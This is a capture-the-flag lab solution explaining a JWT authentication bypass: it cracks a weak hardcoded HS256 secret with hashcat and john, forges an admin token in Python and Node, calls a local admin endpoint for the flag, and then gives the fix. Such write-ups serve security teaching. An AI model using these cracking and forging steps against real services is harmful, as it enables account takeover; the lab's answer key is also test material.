# Solution - Lab #3: Secrets Under The Rug

## The Bug

```javascript
const SECRET = 'secret';
```

The server implements HS256 correctly - the flaw is the secret itself. HMAC is only a password hash; a guessable password makes it worthless.

## Exploit Steps

### 1 - Get a token

Login with any username (not `admin`). The server sets a `session` cookie:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJuYW1lIjoiaGFja2VyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDAwMDAwMDB9
.SomeSignatureHere
```

### 2 - Crack the secret offline

```bash
# Hashcat
hashcat -a 0 -m 16500 token.txt rockyou.txt

# John
john token.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

Result: `secret`

### 3 - Forge an admin token

The payload **must** include `role: "admin"` - that is what the authorization check reads.

```python
import jwt
print(jwt.encode({"name": "hacker", "role": "admin"}, "secret", algorithm="HS256"))
```

Or with curl + the token from step 2:

```bash
# Node.js one-liner
node -e "const j=require('jsonwebtoken'); console.log(j.sign({name:'hacker',role:'admin'},'secret'))"
```

### 4 - Call the admin endpoint

```bash
curl http://localhost:3000/api/admin/users \
  -H "Cookie: session=<FORGED_TOKEN>"
```

Response:

```json
{
  "flag": "FLAG{w34k_53cr3t5_4r3_n0_s3cr3t5}",
  "users": [...]
}
```

## Why It Works

- The secret is in every common wordlist.
- Signature verification is offline - no server interaction needed to crack.
- Once the secret is known, any payload with `role: "admin"` will verify correctly.

## Fix

```javascript
const { randomBytes } = require('crypto');
const SECRET = randomBytes(64).toString('hex');
// Store in an environment variable - never hardcode
```

Or switch to asymmetric signing (RS256/ES256) - no shared secret to steal.

## Automated PoC

```bash
pip install requests pwntools
python poc.py
```

The script logs in, cracks the secret from the wordlist, forges an admin token, and retrieves the flag in one run.

## References

- [Lab: JWT authentication bypass via weak signing key (PortSwigger)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key) - Walks through cracking a short HS256 secret with hashcat using a known wordlist
- [Crack JWT HS256 with hashcat - Hashcat Forums](https://hashcat.net/forum/thread-10787.html) - Community thread with exact mode (-m 16500) and command syntax
- [jwt_tool (ticarpi)](https://github.com/ticarpi/jwt_tool) - Multi-purpose JWT attack toolkit with built-in HMAC brute-force and forging capabilities
